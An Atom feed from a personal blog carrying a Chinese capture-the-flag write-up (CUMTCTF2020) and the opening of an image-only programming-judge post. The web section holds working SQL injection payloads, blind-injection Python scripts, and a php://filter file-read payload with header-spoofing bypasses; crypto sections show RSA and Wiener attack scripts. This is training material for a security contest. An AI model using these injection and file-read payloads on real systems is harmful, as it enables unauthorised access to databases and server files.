<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dragon&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://devildragons.github.io/"/>
  <updated>2020-10-17T08:30:09.728Z</updated>
  <id>https://devildragons.github.io/</id>
  
  <author>
    <name>灬魔龙</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CUMTCTF2020</title>
    <link href="https://devildragons.github.io/2020/09/25/CUMTCTF2020/"/>
    <id>https://devildragons.github.io/2020/09/25/CUMTCTF2020/</id>
    <published>2020-09-24T16:00:00.000Z</published>
    <updated>2020-10-17T08:30:09.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p>一开始显示GET 1,所以传参?1=1，然后显示POST 2，所以使用POST方法传入2=2。</p><pre><code>&lt;?php error_reporting(0);if (!isset($_GET[&quot;1&quot;]))    die(&quot;Please Give me a GET 1 !&quot;);if (!isset($_POST[&quot;2&quot;]))    die(&quot;Please Give me a POST 2 !!&quot;);highlight_file(__FILE__);if (isset($_GET[&quot;file&quot;]))    echo file_get_contents($_GET[&quot;file&quot;]);//Where is the flag??&gt;</code></pre><p>看到题目代码，有文件包含语句，最后构造GET:?1=1&amp;file=flag.php和POST:2在Elements中获得flag。</p><h2 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h2><p>查看源码，发现提示</p><pre><code>&lt;!-- select * from users where user=&apos;$username&apos; and password=&apos;$password&apos; --&gt;</code></pre><p>经过测试发现本题过滤了空格，所以可以使用/<strong>/绕过。<br>POST构造语句`username=admin&amp;password=’or/</strong>/1#`<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj335hpjlwj30hi0e8ta0.jpg" alt=""><br>题目出现回显。<br>这题有三种解法，一是报错注入，二是联合注入，三是盲注。</p><p>报错注入：</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,database()))#&amp;username=admin</code></pre><p>爆出数据库cumtctf。</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;cumtctf&quot;)))#&amp;username=admin</code></pre><p>爆出表名users。</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;users&quot;/**/limit/**/4,1)))#&amp;username=admin</code></pre><p>爆出列名password。</p><pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/concat(password)/**/from/**/users/**/limit/**/7,1)))#&amp;username=admin</code></pre><p>获得flag。</p><p>联合注入：</p><pre><code>password=&apos;/**/union/**/select/**/1,2,3,password,5,6,7,8/**/from/**/users#&amp;username=admin</code></pre><p>盲注：</p><pre><code>import requestsurl = &quot;http://202.119.201.197:13003/&quot;data = {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ):i = i + 1 head=32tail=127while( head &lt; tail ):    mid = (head + tail) // 2    payload = &quot;\&apos;or/**/if(ord(mid((select/**/group_concat(password)/**/from/**/users),%d,1))&gt;%d,1,0)#&quot;%(i,mid)    data[&apos;password&apos;] = payload    r = requests.post(url,data=data)    if &quot;Hello&quot; in r.text :        head = mid + 1    else:        tail = midlast = resultif chr(head)!=&apos;&apos;:    result += chr(head)else:    breakprint(result)</code></pre><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><p>打开只看到一张图片，打开源码也没有什么，将图片下载下来，打开发现源码。</p><pre><code>&lt;?phperror_reporting(0);include_once(&apos;flag.php&apos;);if(isset($_GET[&apos;param1&apos;])){$str1=$_GET[&apos;param1&apos;];if(file_get_contents($str1)!==&apos;Suvin_wants_a_girlfriend&apos;)    die(&quot;Suvin doesn&apos;t like you&quot;);if(isset($_GET[&apos;param2&apos;])){    $str2=$_GET[&apos;param2&apos;];    if(!is_numeric($str2))        die(&apos;Suvin prefers strings of Numbers&apos;);    else if($str2&lt;3600*24*30)        die(&apos;Suvin says the num is too short&apos;);    else if($str2&gt;3600*24*31)        die(&apos;Suvin says the num is too long&apos;);    else {        echo &quot;Suvin says he&apos;s falling in love with you!&quot;.&quot;&lt;/br&gt;&quot;;        sleep(intval($str2));     }    if (isset($_POST[&apos;param1&apos;]) &amp;&amp; isset($_POST[&apos;param2&apos;])) {        $str1=$_POST[&apos;param1&apos;];        $str2=$_POST[&apos;param2&apos;];        if(strlen($str1)&gt;1000)            die(&quot;It&apos;s too long&quot;);        if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))            echo $flag;        else             die(&quot;It&apos;s so similar to md5&quot;);    }}}</code></pre><p>审计代码可知有三个需要绕过的点。</p><p>第一个，file_get_contents漏洞，需要我们传入一个文件并且文件内容为Suvin_wants_a_girlfriend。本题没有符合该内容的文件，所以使用data伪协议。<br>构造：?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k</p><p>第二个是要让str2=2592000,直接输入2592000的话，会下面的sleep函数，需要等很久，但是sleep(intval($str2))可以采用别的方法绕过，输入param2=2.592e6，只需要sleep(2.592)即可。</p><p>第三个便是</p><pre><code>if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))echo $flag;</code></pre><p>sha1进行强比较时是可以通过数组绕过的，但是这里将数据进行了强制转换，所以用数组前半部分就不能通过判断。<br>所以需要找到sha1碰撞。</p><p>参考：<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">https://blog.csdn.net/caiqiiqi/article/details/68953730</a></p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj34g9hxu1j30tn0ig41r.jpg" alt=""><br>用浏览器POST错误，所以使用burpsuite传参获得flag。</p><h2 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h2><p>这题没有回显，所以使用盲注。</p><pre><code>&lt;!-- select * from users where user=&apos;$username&apos; and password=&apos;$password&apos; --&gt;</code></pre><p>查询语句和sql1一样，发现本题引号被过滤了，所以构造 <code>username=admin\&amp;password=or/**/1#</code>，\将单引号转义，显示Login success成功绕过。</p><pre><code>import requestsurl = &quot;http://202.119.201.197:13004/&quot;data = {&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ):i = i + 1 head=32tail=127while( head &lt; tail ):    mid = (head + tail) // 2    payload = &quot;or/**/if(ord(right((select/**/group_concat(password)/**/from/**/users),%d))&gt;%d,1,0)#&quot;%(i,mid)    data[&apos;password&apos;] = payload    r = requests.post(url,data=data)    if &quot;Login success&quot; in r.text :        head = mid + 1    else:        tail = midlast = resultif chr(head)!=&apos;&apos;:    result += chr(head)else:    breakprint(result)</code></pre><p>本题过滤了substr,substring和mid。所以只能用left或者right函数截取字符，这里的脚本用right函数跑出的结果是倒序的，逆转一下即可。</p><h2 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h2><p>进去界面提示需要来自本地。<br>抓包增加X-Forwarded-For:127.0.0.1，提示</p><pre><code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive</code></pre><p>将X-Forwarded-For修改为Client-ip绕过。</p><pre><code>&lt;?phpif ($_SERVER[&apos;HTTP_CLIENT_IP&apos;] != &apos;127.0.0.1&apos; &amp;&amp; $_SERVER[&apos;HTTP_X_REAL_IP&apos;] != &apos;127.0.0.1&apos;){    if ($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] == &quot;127.0.0.1&quot;) {        die(&quot;Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive&quot;);    }    die(&quot;Sorry, this site is only optimized for those who comes from localhost&quot;);}show_source(__FILE__);include_once(&quot;flag.php&quot;);if(isset($_POST[&apos;f&apos;]))   include_once($_POST[&apos;f&apos;]);</code></pre><p>题目给出了源码。<br>发现这题和wmctf2020的Make PHP Great Again类似。<br>/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过。</p><p>payload:</p><pre><code>f=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj35a6hvxhj30vs089t92.jpg" alt=""></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="幼儿园的密码学"><a href="#幼儿园的密码学" class="headerlink" title="幼儿园的密码学"></a>幼儿园的密码学</h2><pre><code># e = 0x10001# n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f# c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d# Hint ： google RSA</code></pre><p>将n转为10进制得    <code>n=106521084065274837947153338013414677016150003618052696631715598225251903811631</code><br>在factordb.com网站分解得</p><pre><code>p=324350545929838254331191385863847627003q=328413456989577256301798468872388310877</code></pre><p>脚本：</p><pre><code>import gmpy2import libnume = 0x10001n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302fc = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2dp=324350545929838254331191385863847627003q=328413456989577256301798468872388310877phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)m=pow(c,d,n)print(libnum.n2s(m))</code></pre><h2 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h2><pre><code>from Secret import flagdef encode(ptext):dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]m = [i for i in ptext]tmp = [];s = []for i in range(len(m)):    for j in range(len(dic)):        if m[i] == dic[j]:            tmp.append(j + 1)for i in tmp:    res = &quot;&quot;    if i &gt;= 8:        res += int(i/8)*&quot;8&quot;    if i%8 &gt;=4:        res += int(i%8/4)*&quot;4&quot;    if i%4 &gt;=2:        res += int(i%4/2)*&quot;2&quot;    if i%2 &gt;= 1:        res += int(i%2/1)*&quot;1&quot;    s.append(res + &quot;0&quot;)print (&quot;&quot;.join(s)[:-1])encode(flag)#2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841</code></pre><p>发现是云影密码。</p><pre><code>def de_code(c):dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]flag = []c2 = [i for i in c.split(&quot;0&quot;)]for i in c2:    c3 = 0    for j in i:        c3 += int(j)    flag.append(dic[c3 - 1])return flags=de_code(&quot;2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841&quot;)print(s)</code></pre><p>参考：<a href="https://blog.csdn.net/lilongsy/article/details/108483119" target="_blank" rel="noopener">https://blog.csdn.net/lilongsy/article/details/108483119</a></p><h2 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h2><pre><code>from Crypto.Util.number import *flag = b&quot;CUMTCTF{***********}&quot;m = bytes_to_long(flag)p = getPrime(2048)q = getPrime(2048)n=p*qprint(&quot;n =&quot;)print(n)print(&quot;x =&quot;)print(p - q)e = 65537print(&quot;e =&quot;)print (e)enc = pow (m,e,n)print(&quot;c =&quot;)print (enc)# 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397# -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636# 65537# 500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609</code></pre><p><code>phi=(p-1)*(q-1)=pq-(p+q)+1</code>，所以要构造p+q，题目给了p-q。<br>所以 <code>(p+q)^2=(p-q)^2+4pq</code>即可求得p+q。</p><pre><code>import gmpy2import libnumn=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397x1=-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636e=65537c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609x2=x1**2+4*nx3=gmpy2.iroot(x2,2)x3=58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078phi=n-x3+1d=gmpy2.invert(e,phi)m=pow(c,d,n)print(libnum.n2s(m))</code></pre><h2 id="维也纳的秘密"><a href="#维也纳的秘密" class="headerlink" title="维也纳的秘密"></a>维也纳的秘密</h2><pre><code>import random, MillerRabin, Arithmeticfrom Crypto.Util.number import *from Secret import flagdef getPrimePair(bits=1024):assert bits%4==0p = MillerRabin.gen_prime(bits)q = MillerRabin.gen_prime_range(p+1, 2*p)return p,qdef generateKeys(nbits=2048):assert nbits%4==0p,q = getPrimePair(nbits//2)n = p*qphi = Arithmetic.totient(p, q)good_d = Falsewhile not good_d:    d = random.getrandbits(nbits//4)    if (Arithmetic.gcd(d,phi) == 1 and 36*pow(d,4) &lt; n):        good_d = Truee = Arithmetic.modInverse(d,phi)return e,n,dm = bytes_to_long(flag)e,n,d = generateKeys()print(e,n)c = pow (m,e,n)print (c)# 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193,106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819# 15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160</code></pre><p>一看题目发现e和n都很大，再根据题目名字，知道这是wiener’s attack.</p><pre><code>import gmpy2import libnumdef transform(x,y):   #使用辗转相处将分数 x/y 转为连分数的形式res=[]while y:    res.append(x//y)    x,y=y,x%yreturn resdef continued_fraction(sub_res):numerator,denominator=1,0for i in sub_res[::-1]:      #从sublist的后面往前循环    denominator,numerator=numerator,i*numerator+denominatorreturn denominator,numerator   #得到渐进分数的分母和分子，并返回#求解每个渐进分数def sub_fraction(x,y):res=transform(x,y)res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数return resdef get_pq(a,b,c):  #由p+q和pq的值通过维达定理来求解p和qpar=gmpy2.isqrt(b*b-4*a*c)   #由上述可得，开根号一定是整数，因为有解x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)return x1,x2def wienerAttack(e,n):for (d,k) in sub_fraction(e,n):  #用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数    if k==0:                     #可能会出现连分数的第一个为0的情况，排除        continue    if (e*d-1)%k!=0:             #ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)        continue    phi=(e*d-1)//k               #这个结果就是 φ(n)    px,qy=get_pq(1,n-phi+1,n)    if px*qy==n:        p,q=abs(int(px)),abs(int(qy))     #可能会得到两个负数，负负得正未尝不会出现        d=gmpy2.invert(e,(p-1)*(q-1))     #求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d        return dprint(&quot;该方法不适用&quot;)e = 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193n = 106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819d=wienerAttack(e,n)c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160m=pow(c,d,n)print(libnum.n2s(m))</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="真·签到题"><a href="#真·签到题" class="headerlink" title="真·签到题"></a>真·签到题</h2><p>用vim打开在文件末尾发现<code>RVdPVkVWSHtVMWlwX2twX3V3ZWVndXVodzExYSF9IA==</code><br>base64编码。<br>解码得到 <code>EWOVEVH{U1ip_kp_uweeguuhw11a!}</code> 发现是凯撒密码，向前移动两位得到flag。</p><h2 id="能看到我吗"><a href="#能看到我吗" class="headerlink" title="能看到我吗"></a>能看到我吗</h2><p>经过爆破，得到压缩包密码是 <code>1433223233</code>，解压得到一张名为twins.png的图片。用binwalk分析发现里面有两个PNG图片。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gj36rgc8pdj30gc05nacv.jpg" alt=""><br>使用foremost命令分离。<br>两张图片的话我所知道的就是用stegsolve合并两张图片或者盲水印。<br>前一个没有明显特征，所以使用后面一个方法。</p><pre><code>python3 bwmforpy3.py decode 00000000.png 00001333.png solve.png</code></pre><p>获得flag。</p><p>参考：<a href="https://github.com/chishaxie/BlindWaterMark#blindwatermark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark#blindwatermark</a></p><h2 id="兔兔那么可爱"><a href="#兔兔那么可爱" class="headerlink" title="兔兔那么可爱"></a>兔兔那么可爱</h2><p>先以为是rabbit密码没解出来。后面根据hint知道是斐波那契数列。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj378xe8qlj30sa028mxe.jpg" alt=""><br>根据数列以及flag文件中字符对应字母的位置，可以获得flag。</p><pre><code>CUMTCTF{Are_rabbits_cute?}</code></pre><p>这题我是根据sublime text软件选取字符来来找的，也能使用脚本跑出flag。脚本自寻查找。</p><h2 id="别做题了听歌吧"><a href="#别做题了听歌吧" class="headerlink" title="别做题了听歌吧"></a>别做题了听歌吧</h2><p>打开发现是一个mp3文件，而且题目说问就是cumt，想到是音频隐写利用mp3stego工具求解。</p><pre><code>Decode.exe -X -P cumt anheqiao.mp3</code></pre><p>得到anheqiao.mp3.txt，打开发现全是空白，但是发现确实有内容，我以为和之前钓鱼城杯的那题一样是whitespace编码，但解出来发现都是乱码，使用sublime text打开发现都是.和——,所以想到摩斯电码，空格是.，tab是-，换行符是/，替换一下进行摩斯电码解密最后包上CUMTCTF{}获得flag。</p><h2 id="大鲨鱼之你可劲找"><a href="#大鲨鱼之你可劲找" class="headerlink" title="大鲨鱼之你可劲找"></a>大鲨鱼之你可劲找</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gj37u7j8zfj316u0g7q5c.jpg" alt=""><br>发现都是盲注的语句，flag形式是CUMTCTF，于是寻找符合条件的盲注语句。<br>经过分析可知，当if为真时返回 <code>Hello,L1dng wants a girlfriend</code>，为假时返回 <code>You should be stronger</code>。<br>照这个思路寻找if为假时的最小值。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gj380b2uy0j314w058mxb.jpg" alt=""><br>第一个字符&gt;67时if为假，而且67是最小的，所以第一个字符的ASCII为67即C。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;Web签到&quot;&gt;&lt;a href=&quot;#Web签到&quot; class=&quot;headerlink&quot; title=&quot;Web签到&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="cumt" scheme="https://devildragons.github.io/tags/cumt/"/>
    
  </entry>
  
  <entry>
    <title>CUMTOJ</title>
    <link href="https://devildragons.github.io/2020/07/07/CUMTOJ/"/>
    <id>https://devildragons.github.io/2020/07/07/CUMTOJ/</id>
    <published>2020-07-06T16:00:00.000Z</published>
    <updated>2020-07-19T12:17:44.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUMTOJ"><a href="#CUMTOJ" class="headerlink" title="CUMTOJ"></a>CUMTOJ</h1><h2 id="财务管理"><a href="#财务管理" class="headerlink" title="财务管理"></a>财务管理</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi85lewybj30xx0famy9.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi866v4rlj30qg0fmq3b.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi7z2tu80j30mj0cmaar.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1ggi80g8i2lj30km0ca74t.jpg" alt=""></p><h2 id="外币兑换"><a href="#外币兑换" class="headerlink" title="外币兑换"></a>外币兑换</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi86uk8x3j31440fntab.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi87iu9jrj30q208mq33.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi82k54sdj30m60gr0tl.jpg" alt=""></p><h2 id="摆积木"><a href="#摆积木" class="headerlink" title="摆积木"></a>摆积木</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8456ygdj31460mln00.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi84sl9bzj30mv09aaa5.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggwjp3lsmdj30hc0hd0td.jpg" alt=""></p><h2 id="当总统"><a href="#当总统" class="headerlink" title="当总统"></a>当总统</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi88iz9zxj314k0fzmyx.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi891kbggj30qz08b74d.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi89u0ioyj30lp0l8q42.jpg" alt=""></p><h2 id="构建矩阵"><a href="#构建矩阵" class="headerlink" title="构建矩阵"></a>构建矩阵</h2><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8awmd1xj311g0fkjsk.jpg" alt=""><br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8bitz0dj30sx0bqt8x.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi8c6tnbcj30mq0i10tn.jpg" alt=""></p><h2 id="期末成绩"><a href="#期末成绩" class="headerlink" title="期末成绩"></a>期末成绩</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8d1imp4j314i0h9q56.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8dgfl8fj30t909hq32.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1ggi8e6d1vbj30lv0hrq41.jpg" alt=""></p><h2 id="奇怪的信"><a href="#奇怪的信" class="headerlink" title="奇怪的信"></a>奇怪的信</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1ggi8ffxrp2j30ys0fet9y.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1ggi8fm52v3j30xh0a6dg0.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1ggi8fvtt6rj30mp0gdmxx.jpg" alt=""></p><h2 id="石头剪子布"><a href="#石头剪子布" class="headerlink" title="石头剪子布"></a>石头剪子布</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1ggi8j01wimj30wb0hnmyu.jpg" alt=""><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1ggi8j712nvj30ru0fhmxg.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1ggi8jexpzyj30od0l1jsm.jpg" alt=""></p><h2 id="电梯升降"><a href="#电梯升降" class="headerlink" 